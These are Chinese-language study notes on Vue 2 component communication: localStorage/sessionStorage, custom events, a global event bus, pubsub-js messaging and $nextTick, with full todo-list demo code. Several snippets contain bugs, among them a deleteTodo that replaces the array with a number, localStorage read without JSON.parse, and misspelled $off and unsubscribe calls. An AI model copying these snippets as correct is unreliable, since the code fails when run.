## 3.6 webStrotage 

1.存储内容大小一般支持5MB左右（不同浏览器可能还不一样）
2.浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制.

3.相关API：
1.`xxxxxStorage.setItem('key' , 'value' );`   

 该方法接受一个键和值作为参数，会把键值对添加到存储中、如果键名存在，则更新其对应的值



2.`xxxxStorage.getItem('key'）`

该方法接受一个键名作为参数，返回键名对应的值



3.`XXXXXStorage.removeItem('key'）`；

该方法接受一个键名作为参数，并把该键名从存储中删除



4.`xxxxStorage.clear()`

该方法会清空存储中的所有数据



### localStraroge

~~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <button onclick="saveData()">点我向localStrorage存储数据</button><br>
    <button onclick="readData()">点我读取localStrorage中的数据</button><br>
    <button onclick="deleteData()">点我删除localStrorage中的数据</button><br>
    <button onclick="clearData()">点我清空localStrorage中的数据</button><br>
    <script type="text/javascript">
        let person ={name:'fgcy',age:21,sex:'男'}

        //保存数据
       function saveData(){
            localStorage.setItem('字符串','aaaaaaaaa');
            localStorage.setItem('数字',123);
            localStorage.setItem('对象',JSON.stringify(person));//直接存的话 会====》  [Object,Object]
        }

        //读取数据
        //读取不存在的 数据时 为 null
        function readData(){
            console.log(localStorage.getItem('字符串'));
            console.log(localStorage.getItem('数字'));
            let obj = localStorage.getItem('对象');
            console.log(JSON.parse(obj));
        }

        //删除一个数据
        function deleteData(){
            localStorage.removeItem('数字');
        }

        //删除全部数据
        function clearData(){
            localStorage.clear();
        }
    </script>
</body>
</html>
~~~~

---

![image-20221023101536355](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210231015777.png)

----



----

![image-20221023101457033](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210231015089.png)

----



### sessionStrotrage

相同的API





备注：

1.SessionStorage存储的内容会随着浏监器窗口关闭而消失

2.LocalStorage存储的内容，需要手动清除才会消失

3.xxxStorage.getItem(xxx）如果XX对应的value获取不到，那么getltem的返回值是null

4.JSON.parse(null）的结果依然是nul







## 自定义事件

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
 import Vue from 'vue'


//引入App组件，它是所有组件的父组件
import App from './App.vue'


//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App),
  mounted(){
      setTimeout(() => {
        //销毁当前vm实例 
        //它之下的子组件 以及子组件的自定义事件都被销毁了
        this.$destroy();
      }, 3000);
  }
}).$mount('#app')
~~~



App.vue

~~~vue
<template>
    <div class="app">
        <h2 >{{msg}}</h2>
        <!-- 通过父组件给子组件传递函数举型 props接收 实现 子给父传递数据 -->
        <School :receiveSchoolName="receiveSchoolName"/>

        <!-- 给student 组件实例对象 绑定一个自定义事件 只要 事件被触发 就会调用 receiveStudentName()-->
        <!-- <Student v-on:atguigu="receiveStudentName"/> -->


        <Student ref="student"/>

    </div>
</template>

<script>
import School from './components/School'
import Student from './components/Student' 


export default {
    components:{School,Student},
    data(){
        return{
            msg:'fgcy'
        }
    },
    methods:{
        receiveSchoolName(name){
            console.log('App收到了学校名:' , name);
        },

        //剩余参数
        receiveStudentName(name,...parems){
            console.log('App收到了学生名:' ,name);
            parems.forEach((parem)=>{
                console.log(parem);
            });
        }
    },
    mounted(){
        //灵活性更强 可以使用定时器什么的
        // this.$refs.student.$on('atguigu',this.receiveStudentName);
        //事件修饰符
        this.$refs.student.$once('atguigu',this.receiveStudentName);
    }
}
</script>

<style scoped>
    .app{
        background-color: gray;
    }
</style>>
~~~



~~~vue
<template>
 <div class="demo">
    <h3>名称：{{name }}</h3>
    <h3>年龄：{{age}}</h3>
    <h3>性别{{sex}}</h3>
    <button @click="sendStudentName">将学生名称传到父组件上</button>
    <button @click="unbind">解绑事件</button>
    <button @click="death">干掉vc当前vc实例</button>
 </div>
</template>
<script>

export default {
    name:'Student',
    data(){
        return {
            name:"fgcy",
            age:12,
            sex:'未知'
        }
    },
    methods:{
        sendStudentName(){
            //触发Student组件实例身上的atguigu事件
            this.$emit('atguigu',this.name,'fgcy',666,888);
        },
        unbind(){
            this.$off('atguigu');//解绑一个
            // this.$off(['atguigu','demo']); //解绑多个
            //this.$off(); //解绑全部
        },
        death(){
            //销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效
            //原生的事件不受影响
            this.$destroy();
        }
    }
}
</script>
<!-- 没有加scoped -->
<style scoped>
.demo{
    background-color: aqua;
}
</style>
~~~



~~~vue
<template>
 <div class=" demo">
    <h3>名称：{{name}}</h3>
    <h3>地址：{{address}}</h3>
    <h3>价格：{{momey+1}}</h3>
    <button @click="sendSchoolName">将学校名称传到父组件上</button>
 </div>
</template>

<script>

export default {
    name:'School',
    data(){
        return {
            name:"中大",
            address:'广东',
            momey:123
        }
    },
    props:['receiveSchoolName'],
    methods:{
        sendSchoolName(){
            this.receiveSchoolName(this.name);
        }
    }
}
</script>

<!-- 没有加scoped -->
<style scoped>
.demo{
    background-color:bisque;
}
</style>
~~~









1.一种组件间通信的方式，适用于：子组件===> 父组件

2.使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件(事件的回调在A中)

3.绑定自定义事件

1.第一种方式，在父组件中：
`<Demo Batguigu="test"/> `或 `<Demo v-on:atguigu="test"/>`
2.第二种方式，在父组件中：

~~~js
<Demo ref="demo"/>
mounted(){
    this.$refs.xxx.$on('atguigu', this.test)
},
methods:{
	test(){
        console.log('1111');
    }
}
~~~

3.若想让自定义事件只能触发一次，可以使用once 修饰符，或 $once 方法

4.触发自定义事件：
`this.$emit（'atguigu'，参数）`

5.解绑自定义事件` this.$off('atguigu')`
6.组件上也可以绑定原生DOM事件，需要使用native 修饰符



### todoList的自定义事件

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
 import Vue from 'vue'


//引入App组件，它是所有组件的父组件
import App from './App.vue'


//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)
}).$mount('#app')

~~~



App.vue

~~~vue
<template>
<div id="root">
  <div class="todo-container">
    <div class="todo-wrap">
        <MyHeader @addTodoObj="addTodoObj"/>
        <List :todos="todos" :checkTodoFlag="checkTodoFlag" :deleteTodo="deleteTodo"/>
        <MyFooter :todos="todos" @selectAll="selectAll" @doClear="doClear"/>
    </div>
  </div>
</div>
</template>

<script>
import MyHeader from './components/MyHeader.vue'
import MyFooter from './components/MyFooter.vue'
import List from './components/List.vue'


export default {
    data(){
        return {
          //前面为空 就用后面的新数组
            todos:localStorage.getItem('todos') || []
        }
    },

    components:{MyHeader,MyFooter,List},
    methods:{
        addTodoObj(todoObj){
            this.todos.unshift(todoObj);
        },
        checkTodoFlag(id){
            this.todos.forEach((obj)=>{
                if(obj.id===id){
                   obj.done=!obj.done;
                }
            })
        },
        //全选 /全不选
        selectAll(checked){
          this.todos.forEach((obj)=>{
            obj.done = checked;
          })
        },
        deleteTodo(id){
          //朴素写法
 /*          this.todos= this.todos.filter((obj)=>{
            return obj.id === id;
          }); */

          //炫酷写法
    /*       this.todos=  this.todos.reduce((pre,current)=>{
            return pre + (current.done === true ? 1:0);
          },0);  */

          //简写
          this.todos = this.todos.reduce((pre,current)=>pre +(current.done === true ? 1:0),0);

        },
        doClear(){
          this.todos = this.todos.filter((obj)=>{
             return obj.done===false;
          });
        }
    },
    watch:{
      todos:{
        deep:true,
        handler(newVal){
          localStorage.setItem('todos',JSON.stringify(newVal));
        }
      }
    }
}
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

/*header*/

/*main*/

/*item*/

/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}

</style>
~~~



MyHeader.vue

~~~vue
<template>
   <div class="todo-header">
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
      </div>
</template>

<script>
    // npm i nanoid
    //精简版的 uuid
    import {nanoid} from 'nanoid'

export default {
    name:'MyHeader',
    data(){
        return {
            name:"中大",
            address:'广东',
            momey:123
        }
    },
    methods:{
        add(event){
            let title=event.target.value;
            if(title=='') return;

            let todoObj={
                id:nanoid(),
                title,
                done:false
            }
            this.$emit('addTodoObj',todoObj)
            event.target.value='';
        }
    }
}
</script>

<!-- 没有加scoped -->
<style scoped>.todo-header input {
    width: 560px;
    height: 28px;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 4px 7px;
  }
  
  .todo-header input:focus {
    outline: none;
    border-color: rgba(82, 168, 236, 0.8);
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
  }
  
</style>
~~~



MyFooter.vue

~~~vue
<template>
      <div class="todo-footer" v-show="totalTodo">
        <label>
          <!-- <input type="checkbox" :checked="totalDone === totalTodo && totalTodo>0"/> -->

          <!-- v-model 默认拿的就是 checkbox的value值 -->
          <input type="checkbox" v-model="isAll"/>

        </label>
        <span>
          <span>已完成{{totalDone}}</span> / 全部{{totalTodo}}
        </span>
        <button class="btn btn-danger" @click="clearDone">清除已完成任务</button>
      </div>
</template>
<script>

export default {
    name:'MyFooter',
    data(){
        return {
            name:"fgcy",
            age:12,
            sex:'未知'
        }
    },
    props:['todos'],

    computed:{
        totalDone(){
            let count=0;
            this.todos.forEach(obj => {
                if(obj.done === true){
                    count++;
                }
            });
            return count;
        },
        totalTodo(){
            return this.todos.length;
        },
        isAll:{
            get(){
                return this.totalDone === this.totalTodo && this.totalTodo>0;
            },
            set(value){
                this.$emit('selectAll',value);
                // this.selectAll(value);
            }
        }
    },
    methods:{
        clearDone(){
            // this.doClear();
            this.$emit('doClear');
        }
    }
}
</script>
<!-- 没有加scoped -->
<style scoped>
.demo{
    background-color: aqua;
}
</style>

~~~



List.vue

~~~vue
<template>
      <ul class="todo-main">
        <Item 
            v-for="todoObj in todos" 
            :key="todoObj.id" 
            :todo="todoObj" 
            :checkTodoFlag="checkTodoFlag"
            :deleteTodo="deleteTodo"
        /> 
    
      </ul>
</template>
<script>
import Item from './Item.vue'
export default {
    name:'List',
    components:{
        Item
    },
    props:['todos','checkTodoFlag','deleteTodo'],

}
</script>
<!-- 没有加scoped -->
<style scoped>
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
} 
</style>

~~~



Item.vue

~~~vue
<template>
       <li>
          <label>
            <input type="checkbox" :checked="todo.done" @change="changeFlag(todo.id)"/>
            <span>{{todo.title}}</span>
          </label>
          <button class="btn btn-danger" @click="doDelete(todo.id)">删除</button>
        </li>
</template>
<script>

export default {
    name:'Item',
    props:['todo','checkTodoFlag','deleteTodo'],
    methods:{
        //改变勾选状态
        changeFlag(id){
          this.checkTodoFlag(id);
        },

        // 删除
        doDelete(id){
            this.deleteTodo(id);
        }
    }
}
</script>
<!-- 没有加scoped -->
<style scoped>
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover {
  background-color: #fff;
}

li:hover button{
  display: block;
}
</style>

~~~







## 全局事件总线：任意组件间通信



### 学校 学生Demo

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
 import Vue from 'vue'

import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false

//组件通信中 的中间人 实现方式一
/* let vc= Vue.extend({});
Vue.prototype.x=new vc(); */



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App),
  
  //组件通信中 的中间人 实现方式二
  beforeCreate(){
    //安装全局事件总线
    // Vue.prototype.x=this;

    Vue.prototype.$bus=this;
  }

}).$mount('#app')

~~~



App.vue

~~~vue
<template>
    <div class="app">
        <h2 >{{msg}}</h2>
        <School/>
        <Student/>

    </div>
</template>

<script>
import School from './components/School'
import Student from './components/Student' 


export default {
    components:{School,Student},
    data(){
        return{
            msg:'fgcy'
        }
    }
}
</script>

<style scoped>
    .app{
        background-color: gray;
    }
</style>>


~~~

Student.vue

~~~vue
<template>
 <div class="demo">
    <h3>名称：{{name }}</h3>
    <h3>年龄：{{age}}</h3>
    <h3>性别{{sex}}</h3>
    <button @click="getStudentName">学生名给学校</button>
 </div>
</template>
<script>

export default {
    name:'Student',
    data(){
        return {
            name:"fgcy",
            age:12,
            sex:'未知'
        }
    },
    methods:{
        getStudentName(){
            // this.x.$emit('getName',this.name);
            this.$bus.$emit('getName',this.name);
        }
    }
}
</script>
<!-- 没有加scoped -->
<style scoped>
.demo{
    background-color: aqua;
}
</style>

~~~



School.vue

~~~vue
<template>
 <div class=" demo">
    <h3>名称：{{name}}</h3>
    <h3>地址：{{address}}</h3>
    <h3>价格：{{momey+1}}</h3>

 </div>
</template>

<script>

export default {
    name:'School',
    data(){
        return {
            name:"中大",
            address:'广东',
            momey:123
        }
    },
    mounted(){
        // this.x.$on('getName',(name)=>{
        this.$bus.$on('getName',(name)=>{
            console.log('学生名：', name);
        });
    },
    beforeDestroy(){
        this.$bus.off('getName');
    }
}
</script>

<!-- 没有加scoped -->
<style scoped>
.demo{
    background-color:bisque;
}
</style>
~~~



准备一个对象 对任何 vc都可见

----

![image-20221023154201678](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210231542294.png)

----







全局事件总线（GlobalEventBus)



1.一种组件间通信的方式，适用于任意组件间通信
2.安装全局事件总线

~~~js
new Vue({
    beforeCreate（）{
    Vue.prototype.sbus = this//安装全局事件总线，$bus就是当前应用的vm
    }
)};
~~~

3.信田事件总线

​	1 - 接收数据：A组件想接收数据、则在A组件中给Sbus绑定自定义事件、事件的回调留在A组件自身

~~~js
methods(){
    //定义回调函数
    demo(data){......}
}
    
mounted() {
    //绑定组件与事件与回调函数
    this.$bus.$on('xxx',this.demo)
}
~~~

​	2- 提供数据：`this.$bus.$emit('xxxx',数据)`

4.最好在beforeDestroy钩子中、用$0ff() 去解绑当前组件所用到的事件







### 全局事件总线 todolist

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'


//引入App组件，它是所有组件的父组件
import App from './App.vue'


//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App),

  //安装全局事件总线
  beforeCreate(){
    Vue.prototype.$bus=this;
  }
}).$mount('#app')

~~~





App.vue

~~~vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader @addTodoObj="addTodoObj"/>

        <!-- :checkTodoFlag="checkTodoFlag" :deleteTodo="deleteTodo" -->
          <List :todos="todos"/>

          <MyFooter :todos="todos" @selectAll="selectAll" @doClear="doClear"/>
      </div>
    </div>
  </div>
  </template>
  
  <script>
  import MyHeader from './components/MyHeader.vue'
  import MyFooter from './components/MyFooter.vue'
  import List from './components/List.vue'
  
  
  export default {
      data(){
          return {
            //前面为空 就用后面的新数组
              todos: JSON.parse(localStorage.getItem('todos')) || []
          }
      },
  
      components:{MyHeader,MyFooter,List},
      methods:{
          addTodoObj(todoObj){
              this.todos.unshift(todoObj);
          },
          checkTodoFlag(id){
              this.todos.forEach((obj)=>{
                  if(obj.id===id){
                     obj.done=!obj.done;
                  }
              })
          },
          //全选 /全不选
          selectAll(checked){
            this.todos.forEach((obj)=>{
              obj.done = checked;
            })
          },
          deleteTodo(id){
            this.todos = this.todos.reduce((pre,current)=>pre +(current.done === true ? 1:0),0);
          },
          doClear(){
            this.todos = this.todos.filter((obj)=>{
               return obj.done===false;
            });
          }
      },
      watch:{
        todos:{
          deep:true,
          handler(newVal){
            localStorage.setItem('todos',JSON.stringify(newVal));
          }
        }
      },
      mounted(){
        this.$bus.$on('checkTodoFlag',this.checkTodoFlag);
        this.$bus.$on('deleteTodo',this.deleteTodo);
      },
      beforeDestroy(){
        this.$bus.$off('checkTodoFlag');
        this.$bus.$off('deleteTodo');
      },
      }
  
  </script>
  
  <style>
  /*base*/
  body {
    background: #fff;
  }
  
  .btn {
    display: inline-block;
    padding: 4px 12px;
    margin-bottom: 0;
    font-size: 14px;
    line-height: 20px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
    border-radius: 4px;
  }
  
  .btn-danger {
    color: #fff;
    background-color: #da4f49;
    border: 1px solid #bd362f;
  }
  
  .btn-danger:hover {
    color: #fff;
    background-color: #bd362f;
  }
  
  .btn:focus {
    outline: none;
  }
  
  .todo-container {
    width: 600px;
    margin: 0 auto;
  }
  .todo-container .todo-wrap {
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
  }
  
  /*header*/
  
  /*main*/
  
  /*item*/
  
  /*footer*/
  .todo-footer {
    height: 40px;
    line-height: 40px;
    padding-left: 6px;
    margin-top: 5px;
  }
  
  .todo-footer label {
    display: inline-block;
    margin-right: 20px;
    cursor: pointer;
  }
  
  .todo-footer label input {
    position: relative;
    top: -1px;
    vertical-align: middle;
    margin-right: 5px;
  }
  
  .todo-footer button {
    float: right;
    margin-top: 5px;
  }
  
  </style>
~~~



MyHeader.vue

~~~~vue
<template>
    <div class="todo-header">
         <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
       </div>
 </template>
 
 <script>
     // npm i nanoid
     //精简版的 uuid
     import {nanoid} from 'nanoid'
 
 export default {
     name:'MyHeader',
     data(){
         return {
             name:"中大",
             address:'广东',
             momey:123
         }
     },
     methods:{
         add(event){
             let title=event.target.value;
             if(title=='') return;
 
             let todoObj={
                 id:nanoid(),
                 title,
                 done:false
             }
             this.$emit('addTodoObj',todoObj)
             event.target.value='';
         }
     }
 }
 </script>
 
 <!-- 没有加scoped -->
 <style scoped>.todo-header input {
     width: 560px;
     height: 28px;
     font-size: 14px;
     border: 1px solid #ccc;
     border-radius: 4px;
     padding: 4px 7px;
   }
   
   .todo-header input:focus {
     outline: none;
     border-color: rgba(82, 168, 236, 0.8);
     box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
   }
   
 </style>
~~~~

~~~vue
<template>
    <div class="todo-footer" v-show="totalTodo">
      <label>
        <!-- <input type="checkbox" :checked="totalDone === totalTodo && totalTodo>0"/> -->

        <!-- v-model 默认拿的就是 checkbox的value值 -->
        <input type="checkbox" v-model="isAll"/>

      </label>
      <span>
        <span>已完成{{totalDone}}</span> / 全部{{totalTodo}}
      </span>
      <button class="btn btn-danger" @click="clearDone">清除已完成任务</button>
    </div>
</template>
<script>

export default {
  name:'MyFooter',
  data(){
      return {
          name:"fgcy",
          age:12,
          sex:'未知'
      }
  },
  props:['todos'],

  computed:{
      totalDone(){
          let count=0;
          this.todos.forEach(obj => {
              if(obj.done === true){
                  count++;
              }
          });
          return count;
      },
      totalTodo(){
          return this.todos.length;
      },
      isAll:{
          get(){
              return this.totalDone === this.totalTodo && this.totalTodo>0;
          },
          set(value){
              this.$emit('selectAll',value);
              // this.selectAll(value);
          }
      }
  },
  methods:{
      clearDone(){
          // this.doClear();
          this.$emit('doClear');
      }
  }
}
</script>
<!-- 没有加scoped -->
<style scoped>
.demo{
  background-color: aqua;
}
</style>

~~~

LIst.vue

~~~vue
<template>
  <ul class="todo-main">
    <Item 
        v-for="todoObj in todos" 
        :key="todoObj.id" 
        :todo="todoObj" 
    /> 

  </ul>
</template>
<script>
import Item from './Item.vue'
export default {
name:'List',
components:{
    Item
},
props:['todos'],

}
</script>
<!-- 没有加scoped -->
<style scoped>
.todo-main {
margin-left: 0px;
border: 1px solid #ddd;
border-radius: 2px;
padding: 0px;
}

.todo-empty {
height: 40px;
line-height: 40px;
border: 1px solid #ddd;
border-radius: 2px;
padding-left: 5px;
margin-top: 10px;
} 
</style>

~~~



Item.vue

~~~vue
<template>
  <li>
     <label>
       <input type="checkbox" :checked="todo.done" @change="changeFlag(todo.id)"/>
       <span>{{todo.title}}</span>
     </label>
     <button class="btn btn-danger" @click="doDelete(todo.id)">删除</button>
   </li>
</template>
<script>

export default {
name:'Item',
props:['todo'],
methods:{
   //改变勾选状态
   changeFlag(id){
    //  this.checkTodoFlag(id);
     this.$emit('checkTodoFlag',id)
   },

   // 删除
   doDelete(id){
      //  this.deleteTodo(id);
      this.$emit('deleteTodo',id)
   }
}
}
</script>
<!-- 没有加scoped -->
<style scoped>
li {
list-style: none;
height: 36px;
line-height: 36px;
padding: 0 5px;
border-bottom: 1px solid #ddd;
}

li label {
float: left;
cursor: pointer;
}

li label li input {
vertical-align: middle;
margin-right: 6px;
position: relative;
top: -1px;
}

li button {
float: right;
display: none;
margin-top: 3px;
}

li:before {
content: initial;
}

li:last-child {
border-bottom: none;
}

li:hover {
background-color: #fff;
}

li:hover button{
display: block;
}
</style>

~~~

----

![image-20221023164915182](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210231649250.png)

----







## 消息订阅与发布

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'

import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false

//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App),

}).$mount('#app')

~~~



App.vue

~~~vue
<template>
    <div class="app">
        <h2 >{{msg}}</h2>
        <School/>
        <Student/>

    </div>
</template>

<script>
import School from './components/School'
import Student from './components/Student' 


export default {
    components:{School,Student},
    data(){
        return{
            msg:'fgcy'
        }
    }
}
</script>

<style scoped>
    .app{
        background-color: gray;
    }
</style>>

~~~



Studend.vue

~~~vue
<template>
    <div class="demo">
       <h3>名称：{{name }}</h3>
       <h3>年龄：{{age}}</h3>
       <h3>性别{{sex}}</h3>
       <button @click="getStudentName">学生名给学校</button>
    </div>
   </template>
   <script>
    import pubsub from 'pubsub-js'

   export default {
       name:'Student',
       data(){
           return {
               name:"fgcy",
               age:12,
               sex:'未知'
           }
       },
       methods:{
           getStudentName(){
            pubsub.publish('hello',666);
           }
       }
   }
   </script>
   <!-- 没有加scoped -->
   <style scoped>
   .demo{
       background-color: aqua;
   }
   </style>
   
~~~



School.vue

~~~vue
<template>
    <div class=" demo">
       <h3>名称：{{name}}</h3>
       <h3>地址：{{address}}</h3>
       <h3>价格：{{momey+1}}</h3>
    </div>
   </template>
   
   <script>
   import pubsub from 'pubsub-js'
   export default {
       name:'School',
       data(){
           return {
               name:"中大",
               address:'广东',
               momey:123
           }
       },

       //初始化订阅发布器
        mounted(){
            //像定时器
          this.pubId=  pubsub.subscribe('hello',(name,data)=>{
                console.log("订阅 "+name+"回调",data);
            });
        },
        //移除订阅发布器
        beforeDestroy(){
            pubsub.unsunscript(this.pubId);
        }
   }
   </script>
   
   <!-- 没有加scoped -->
   <style scoped>
   .demo{
       background-color:bisque;
   }
   </style>
~~~



### 小结:消息订阅与发布（pubsub）

1.一种组件间通信的方式，适用于任意组件间通信

2.使用步骤

​	1.安装pubsub：`npm i pubsub-js`
2.引|入：`import pubsub from 'pubsub-js'`

3.接收教据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身

~~~~js
methods(){
	demo（data）{......}
},
    ..................
mounted(){
   this.pid = pubsub.subscribe('xxx'，this.demo)//订阅消息
} 
    
beforeDestroy(){
    pubsub.unsubscript(this.pid);
}
~~~~

4.订阅：pubsub.publish("xxx'，数据)

5.最好在beforeDestroy钩子中，用Pubsub.unsubscribe（pid）去<span sty1e="color:red">取消订阅。</span>













## todoList 修改功能

### $nextTick

1.语法：this.$nextTick（回调函数）
2.作用：在下一次 DOM 更新结束后执行其指定的回调
3.什么时候用：当改变数据后，要基于重新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行



main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'


//引入App组件，它是所有组件的父组件
import App from './App.vue'


//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App),

  //安装全局事件总线
  beforeCreate(){
    Vue.prototype.$bus=this;
  }
}).$mount('#app')

~~~



App.vue

~~~vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader @addTodoObj="addTodoObj"/>

        <!-- :checkTodoFlag="checkTodoFlag" :deleteTodo="deleteTodo" -->
          <List :todos="todos"/>

          <MyFooter :todos="todos" @selectAll="selectAll" @doClear="doClear"/>
      </div>
    </div>
  </div>
  </template>
  
  <script>
  import MyHeader from './components/MyHeader.vue'
  import MyFooter from './components/MyFooter.vue'
  import List from './components/List.vue'
  
  
  export default {
      data(){
          return {
            //前面为空 就用后面的新数组
              todos: JSON.parse(localStorage.getItem('todos')) || []
          }
      },
  
      components:{MyHeader,MyFooter,List},
      methods:{
          addTodoObj(todoObj){
              this.todos.unshift(todoObj);
          },
          checkTodoFlag(id){
              this.todos.forEach((obj)=>{
                  if(obj.id===id){
                     obj.done=!obj.done;
                  }
              })
          },
          //全选 /全不选
          selectAll(checked){
            this.todos.forEach((obj)=>{
              obj.done = checked;
            })
          },
          deleteTodo(id){
            this.todos = this.todos.filter((obj)=>{
              console.log(obj.id!==id);
              return obj.id!==id;
            });
          },
          doClear(){
            this.todos = this.todos.filter((obj)=>{
               return obj.done===false;
            });
          }
      },
      watch:{
        todos:{
          deep:true,
          handler(newVal){
            localStorage.setItem('todos',JSON.stringify(newVal));
          }
        }
      },
      mounted(){
        this.$bus.$on('checkTodoFlag',this.checkTodoFlag);
        this.$bus.$on('deleteTodo',this.deleteTodo);
      },
      beforeDestroy(){
        this.$bus.$off('checkTodoFlag');
        this.$bus.$off('deleteTodo');
      },
      }
  
  </script>
  
  <style>
  /*base*/
  body {
    background: #fff;
  }
  
  .btn {
    display: inline-block;
    padding: 4px 12px;
    margin-bottom: 0;
    font-size: 14px;
    line-height: 20px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
    border-radius: 4px;
  }
  
  .btn-danger {
    color: #fff;
    background-color: #da4f49;
    border: 1px solid #bd362f;
  }

  .btn-edit {
    color: #fff;
    background-color: skyblue;
    border: 1px solid rgb(102, 153, 173);
    margin-right: 3px;
  }


  
  .btn-danger:hover {
    color: #fff;
    background-color: #bd362f;
  }
  
  .btn:focus {
    outline: none;
  }
  
  .todo-container {
    width: 600px;
    margin: 0 auto;
  }
  .todo-container .todo-wrap {
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
  }
  
  /*header*/
  
  /*main*/
  
  /*item*/
  
  /*footer*/
  .todo-footer {
    height: 40px;
    line-height: 40px;
    padding-left: 6px;
    margin-top: 5px;
  }
  
  .todo-footer label {
    display: inline-block;
    margin-right: 20px;
    cursor: pointer;
  }
  
  .todo-footer label input {
    position: relative;
    top: -1px;
    vertical-align: middle;
    margin-right: 5px;
  }
  
  .todo-footer button {
    float: right;
    margin-top: 5px;
  }
  
  </style>
~~~



MyHeader.vue

~~~vue
<template>
    <div class="todo-header">
         <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
       </div>
 </template>
 
 <script>
     // npm i nanoid
     //精简版的 uuid
     import {nanoid} from 'nanoid'
 
 export default {
     name:'MyHeader',
     data(){
         return {
             name:"中大",
             address:'广东',
             momey:123
         }
     },
     methods:{
         add(event){
             let title=event.target.value;
             if(title=='') return;
 
             let todoObj={
                 id:nanoid(),
                 title,
                 done:false
             }
             this.$emit('addTodoObj',todoObj)
             event.target.value='';
         }
     }
 }
 </script>
 
 <!-- 没有加scoped -->
 <style scoped>.todo-header input {
     width: 560px;
     height: 28px;
     font-size: 14px;
     border: 1px solid #ccc;
     border-radius: 4px;
     padding: 4px 7px;
   }
   
   .todo-header input:focus {
     outline: none;
     border-color: rgba(82, 168, 236, 0.8);
     box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
   }
   
 </style>
~~~



MyFooter.vue

~~~vue
